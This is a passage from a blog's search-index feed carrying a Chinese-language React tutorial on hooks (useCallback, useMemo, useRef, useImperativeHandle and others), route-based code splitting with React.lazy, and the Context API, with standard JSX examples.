state。）需要注意的是，React 可能仍需要在跳过渲染前再次渲染该组件。不过由于 React 不会对组件树的“深层”节点进行不必要的渲染，所以大可不必担心。如果你在渲染期间执行了高开销的计算，则可以使用 <code>useMemo</code> 来进行优化。</p><p>&#x3D;&#x3D;useCallback&#x3D;&#x3D;：返回一个memoized回调函数。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> memoizedCallback = <span class="hljs-title function_">useCallback</span>(<br>  <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">doSomething</span>(a, b);<br>  &#125;,<br>  [a, b],<br>);<br></code></pre></td></tr></table></figure><p>把内联回调函数及依赖项数组作为参数传入 <code>useCallback</code>，它将返回该回调函数的 memoized 版本，该回调函数仅在某个依赖项改变时才会更新。当你把回调函数传递给经过优化的并使用引用相等性去避免非必要渲染（例如 <code>shouldComponentUpdate</code>）的子组件时，它将非常有用。</p><p><code>useCallback(fn, deps)</code> 相当于 <code>useMemo(() =&gt; fn, deps)</code>。</p><p>&#x3D;&#x3D;useMemo&#x3D;&#x3D;：返回一个 <a href="https://en.wikipedia.org/wiki/Memoization">memoized</a> 值。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> memoizedValue = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">computeExpensiveValue</span>(a, b), [a, b]);<br></code></pre></td></tr></table></figure><p>把“创建”函数和依赖项数组作为参数传入 <code>useMemo</code>，它仅会在某个依赖项改变时才重新计算 memoized 值。这种优化有助于避免在每次渲染时都进行高开销的计算。记住，传入 <code>useMemo</code> 的函数会在渲染期间执行。请不要在这个函数内部执行与渲染无关的操作，诸如副作用这类的操作属于 <code>useEffect</code> 的适用范畴，而不是 <code>useMemo</code>。如果没有提供依赖项数组，<code>useMemo</code> 在每次渲染时都会计算新的值。</p><p><strong>你可以把 <code>useMemo</code> 作为性能优化的手段，但不要把它当成语义上的保证。</strong>将来，React 可能会选择“遗忘”以前的一些 memoized 值，并在下次渲染时重新计算它们，比如为离屏组件释放内存。先编写在没有 <code>useMemo</code> 的情况下也可以执行的代码 —— 之后再在你的代码中添加 <code>useMemo</code>，以达到优化性能的目的。</p><p>&#x3D;&#x3D;useRef&#x3D;&#x3D;：返回一个可变的 ref 对象，其 <code>.current</code> 属性被初始化为传入的参数（<code>initialValue</code>）。返回的 ref 对象在组件的整个生命周期内保持不变。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx\">const refContainer = useRef(initialValue);<br></code></pre></td></tr></table></figure><p>一个常见的用例便是命令式地访问子组件：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">TextInputWithFocusButton</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> inputEl = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">onButtonClick</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-comment">// `current` 指向已挂载到 DOM 上的文本输入元素</span><br>    inputEl.<span class="hljs-property">current</span>.<span class="hljs-title function_">focus</span>();<br>  &#125;;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;inputEl&#125;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;onButtonClick&#125;</span>&gt;</span>Focus the input<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>本质上，<code>useRef</code> 就像是可以在其 <code>.current</code> 属性中保存一个可变值的“盒子”。你应该熟悉 ref 这一种访问 DOM的主要方式。如果你将 ref 对象以 <code>&lt;div ref=&#123;myRef&#125; /&gt;</code> 形式传入组件，则无论该节点如何改变，React 都会将 ref 对象的 <code>.current</code> 属性设置为相应的 DOM 节点。</p><p>然而，<code>useRef()</code> 比 <code>ref</code> 属性更有用。它可以很方便地保存任何可变值，其类似于在 class 中使用实例字段的方式。这是因为它创建的是一个普通 Javascript 对象。而 <code>useRef()</code> 和自建一个 <code>&#123;current: ...&#125;</code> 对象的唯一区别是，<code>useRef</code> 会在每次渲染时返回同一个 ref 对象。请记住，当 ref 对象内容发生变化时，<code>useRef</code> 并<em>不会</em>通知你。变更 <code>.current</code> 属性不会引发组件重新渲染。如果想要在 React 绑定或解绑 DOM 节点的 ref 时运行某些代码，则需要使用<a href="https://react.docschina.org/docs/hooks-faq.html#how-can-i-measure-a-dom-node">回调 ref</a> 来实现。</p><p>&#x3D;&#x3D;useImperativeHandle&#x3D;&#x3D;：在使用 <code>ref</code> 时自定义暴露给父组件的实例值。在大多数情况下，应当避免使用 ref 这样的命令式代码。<code>useImperativeHandle</code> 应当与 <a href="https://react.docschina.org/docs/react-api.html#reactforwardref"><code>forwardRef</code></a> 一起使用：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">FancyInput</span>(<span class="hljs-params">props, ref</span>) &#123;<br>  <span class="hljs-keyword">const</span> inputRef = <span class="hljs-title function_">useRef</span>();<br>  <span class="hljs-title function_">useImperativeHandle</span>(ref, <span class="hljs-function">() =&gt;</span> (&#123;<br>    <span class="hljs-attr">focus</span>: <span class="hljs-function">() =&gt;</span> &#123;<br>      inputRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">focus</span>();<br>    &#125;<br>  &#125;));<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;inputRef&#125;</span> <span class="hljs-attr">...</span> /&gt;</span></span>;<br>&#125;<br><span class="hljs-title class_">FancyInput</span> = <span class="hljs-title function_">forwardRef</span>(<span class="hljs-title class_">FancyInput</span>);<br></code></pre></td></tr></table></figure><p>在本例中，渲染 <code>&lt;FancyInput ref=&#123;inputRef&#125; /&gt;</code> 的父组件可以调用 <code>inputRef.current.focus()</code>。</p><p>&#x3D;&#x3D;useLayoutEffect&#x3D;&#x3D;：其函数签名与 <code>useEffect</code> 相同，但它会在所有的 DOM 变更之后同步调用 effect。可以使用它来读取 DOM 布局并同步触发重渲染。在浏览器执行绘制之前，<code>useLayoutEffect</code> 内部的更新计划将被同步刷新。尽可能使用标准的 <code>useEffect</code> 以避免阻塞视觉更新。</p><p>&#x3D;&#x3D;useDebugValue&#x3D;&#x3D;： 可用于在 React 开发者工具中显示自定义 hook 的标签。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-title function_">useDebugValue</span>(value)<br></code></pre></td></tr></table></figure><h3 id="29-基于路由的代码分割"><a href="#29-基于路由的代码分割" class="headerlink" title="29. 基于路由的代码分割"></a>29. 基于路由的代码分割</h3><p>如何在你的应用中使用 <code>React.lazy</code> 和 <a href="https://react-router.docschina.org/">React Router</a> 这类的第三方库，来配置基于路由的代码分割。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; <span class="hljs-title class_">Suspense</span>, lazy &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">BrowserRouter</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">Router</span>, <span class="hljs-title class_">Route</span>, <span class="hljs-title class_">Switch</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">Home</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">import</span>(<span class="hljs-string">&#x27;./routes/Home&#x27;</span>));<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">About</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">import</span>(<span class="hljs-string">&#x27;./routes/About&#x27;</span>));<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">App</span> = (<span class="hljs-params"></span>) =&gt; (<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Router</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">div</span>&gt;</span>Loading...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>&#125;&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Switch</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">exact</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">component</span>=<span class="hljs-string">&#123;Home&#125;/</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/about&quot;</span> <span class="hljs-attr">component</span>=<span class="hljs-string">&#123;About&#125;/</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Switch</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">Router</span>&gt;</span></span><br>);<br></code></pre></td></tr></table></figure><h3 id="30-Context：在组件树间进行数据传递的方法"><a href="#30-Context：在组件树间进行数据传递的方法" class="headerlink" title="30.Context：在组件树间进行数据传递的方法"></a>30.Context：在组件树间进行数据传递的方法</h3><p>在一个典型的 React 应用中，数据是通过 props 属性自上而下（由父及子）进行传递的，但这种做法对于某些类型的属性而言是极其繁琐的（例如：地区偏好，UI 主题），这些属性是应用程序中许多组件都需要的。Context 提供了一种在组件之间共享此类值的方式，而不必显式地通过组件树的逐层传递 props。</p><p>Context 主要应用场景在于很多不同层级的组件需要访问同样一些的数据。请谨慎使用，因为这会使得组件的复用性变差。</p><p><strong><code>React.createContext</code></strong></p><p>创建一个Context对象。当 React 渲染一个订阅了这个 Context 对象的组件，这个组件会从组件树中离自身最近的那个匹配的 <code>Provider</code> 中读取到当前的 context 值。</p><p><strong>只有</strong>当组件所处的树中没有匹配到 Provider 时，其 <code>defaultValue</code> 参数才会生效。这有助于在不使用 Provider 包装组件的情况下对组件进行测试。注意：将 <code>undefined</code> 传递给 Provider 的 value 时，消费组件的 <code>defaultValue</code> 不会生效。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> <span class="hljs-title class_">MyContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>(defaultValue);<br></code></pre></td></tr></table></figure><p><strong><code>Context.Provider</code></strong></p><p>每个 Context 对象都会返回一个 Provider React 组件，它允许消费组件订阅 context 的变化。</p><p>Provider 接收一个 <code>value</code> 属性，传递给消费组件。一个 Provider 可以和多个消费组件有对应关系。多个 Provider 也可以嵌套使用，里层的会覆盖外层的数据。</p><p>当 Provider 的 <code>value</code> 值发生变化时，它内部的所有消费组件都会重新渲染。Provider 及其内部 consumer 组件都不受制于 <code>shouldComponentUpdate</code> 函数，因此当 consumer 组件在其祖先组件退出更新的情况下也能更新。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">&lt;<span class="hljs-title class_">MyContext</span>.<span class="hljs-property">Provider</span> value=&#123;<span class="hljs-comment">/* 某个值 */</span>&#125;&gt;<br></code></pre></td></tr></table></figure><p><strong><code>Context.Consumer</code></strong></p><p>这里，React 组件也可以订阅到 context 变更。这能让你在<a href="https://react.docschina.org/docs/components-and-props.html#function-and-class-components">函数式组件</a>中完成订阅 context。</p><p>这需要<a href="https://react.docschina.org/docs/render-props.html#using-props-other-than-render">函数作为子元素（function as a child）</a>这种做法。这个函数接收当前的 context 值，返回一个 React 节点。传递给函数的 <code>value</code> 值等同于往上组件树离这个 context 最近的 Provider 提供的 <code>value</code> 值。如果没有对应的 Provider，<code>value</code> 参数等同于传递给 <code>createContext()</code> 的 <code>defaultValue</code>。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jsx">&lt;<span class="hljs-title class_">MyContext</span>.<span class="hljs-property">Consumer</span>&gt;<br>  &#123;<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> <span class="hljs-comment">/* 基于 context 值进行渲染*/</span>&#125;<br>&lt;/<span class="hljs-title class_">MyContext</span>.<span class="hljs-property">Consumer</span>&gt;<br></code></pre></td></tr></table></figure><p><strong>在嵌套组件中更新 Context</strong></p><p>从一个在组件树中嵌套很深的组件中更新 context 是很有必要的。在这种场景下，你可以通过 context 传递一个函数，使得 consumers 组件更新 context：</p><p>theme-context.js</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">// 确保传递给 createContext 的默认值数据结构是调用的组件（consumers）所能匹配的！</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">ThemeContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>(&#123;<br>  <span class="hljs-attr">theme</span>: themes.<span class="hljs-property">dark</span>,<br>  <span class="hljs-attr">toggleTheme</span>: <span class="hljs-function">() =&gt;</span> &#123;&#125;,<br>&#125;);<br></code></pre></td></tr></table></figure><p>theme-toggler-button.js</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> &#123;<span class="hljs-title class_">ThemeContext</span>&#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./theme-context&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ThemeTogglerButton</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// Theme Toggler 按钮不仅仅只获取 theme 值，它也从 context 中获取到一个 toggleTheme 函数</span><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Consumer</span>&gt;</span></span><br><span class="language-xml">      &#123;(&#123;theme, toggleTheme&#125;) =&gt; (</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">button</span>          <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;toggleTheme&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;&#123;backgroundColor:</span> <span class="hljs-attr">theme.background</span>&#125;&#125;&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">          Toggle Theme</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      )&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Consumer</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">ThemeTogglerButton</span>;<br></code></pre></td></tr></table></figure><p>app.js</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> &#123;<span class="hljs-title class_">ThemeContext</span>, themes&#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./theme-context&#x27;</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-title class_">ThemeTogglerButton</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./theme-toggler-button&#x27;</span>;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(props);<br><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">toggleTheme</span> = <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> (&#123;<br>        <span class="hljs-attr">theme</span>:<br>          state.<span class="hljs-property">theme</span> === themes.<span class="hljs-property">dark</span><br>            ? themes.<span class="hljs-property">light</span><br>            : themes.<span class="hljs-property">dark</span>,<br>      &#125;));<br>    &#125;;<br><br>    <span class="hljs-comment">// State 也包含了更新函数，因此它会被传递进 context provider。</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = &#123;<br>      <span class="hljs-attr">theme</span>: themes.<span class="hljs-property">light</span>,<br>      <span class="hljs-attr">toggleTheme</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">toggleTheme</span>,<br>    &#125;;<br>  &#125;<br><br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 整个 state 都被传递进 provider</span><br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;this.state&#125;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Content</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Provider</span>&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Content</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ThemeTogglerButton</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">render</span>(<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span>, <span class="hljs-variable language_">document</span>.<span class="hljs-property">root</span>);<br><br></code></pre></td></tr></table></figure><p><strong>消费多个 Context</strong></p><p>为了确保 context 快速进行重渲染，React 需要使每一个 consumers 组件的 context 在组件树中成为一个单独的节点。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">// Theme context，默认的 theme 是 “light” 值</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ThemeContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>(<span class="hljs-string">&#x27;light&#x27;</span>);<br><br><span class="hljs-comment">// 用户登录 context</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">UserContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>(&#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Guest&#x27;</span>,<br>&#125;);<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> &#123;signedInUser, theme&#125; = <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>;<br><br>    <span class="hljs-comment">// 提供初始 context 值的 App 组件</span><br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;theme&#125;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">UserContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;signedInUser&#125;</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">Layout</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">UserContext.Provider</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Provider</span>&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Layout</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Sidebar</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Content</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 一个组件可能会消费多个 context</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Content</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Consumer</span>&gt;</span></span><br><span class="language-xml">      &#123;theme =&gt; (</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">UserContext.Consumer</span>&gt;</span></span><br><span class="language-xml">          &#123;user =&gt; (</span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">ProfilePage</span> <span class="hljs-attr">user</span>=<span class="hljs-string">&#123;user&#125;</span> <span class="hljs-attr">theme</span>=<span class="hljs-string">&#123;theme&#125;</span> /&gt;</span></span><br><span class="language-xml">          )&#125;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">UserContext.Consumer</span>&gt;</span></span><br><span class="language-xml">      )&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Consumer</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>如果两个或者更多的 context 值经常被一起使用，那你可能要考虑一下另外创建你自己的渲染组件，以提供这些值。</p><p>注意事项：因为 context 会使用参考标识（reference identity）来决定何时进行渲染，这里可能会有一些陷阱，当 provider 的父组件进行重渲染时，可能会在 consumers 组件中触发意外的渲染。举个例子，当每一次 Provider 重渲染时，以下的代码会重渲染所有下面的 consumers 组件，因为 <code>value</code> 属性总是被赋值为新的对象。</p><p>为了防止这种情况，将 value 状态提升到父节点的 state 里：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(props);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = &#123;<br>      <span class="hljs-attr">value</span>: &#123;<span class="hljs-attr">something</span>: <span class="hljs-string">&#x27;something&#x27;</span>&#125;,<br>    &#125;;<br>  &#125;<br><br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;this.state.value&#125;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Toolbar</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Provider</span>&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>前端</tag>
      
      <tag>react</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
